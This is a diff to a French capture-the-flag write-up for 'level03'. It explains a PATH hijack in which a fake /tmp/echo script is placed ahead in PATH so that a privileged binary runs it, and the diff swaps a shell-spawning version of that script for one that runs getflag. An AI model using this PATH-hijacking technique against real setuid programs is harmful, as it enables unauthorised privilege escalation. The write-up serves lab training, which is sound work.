@@ -19,12 +19,8 @@ On peut voir qu'il y a une utilisation de la fonction env via son path absolu, c
 
 On peut donc hijack le PATH pour lancer notre propre script plutot que la fonction echo :
 
-echo -e '#!/bin/sh' > /tmp/echo
+echo getflag > /tmp/echo
 chmod +x /tmp/echo
 export PATH=/tmp:$PATH
 
 ensuite on lance ./level03
-
-ca lancera un nouveau shell, mais cette fois ci on est connecte en tant que flag03 ! On peut regarder en lancant "whoami"
-Et si on est connecte en tant que flag03, il suffit de lancer ; getflag !
-
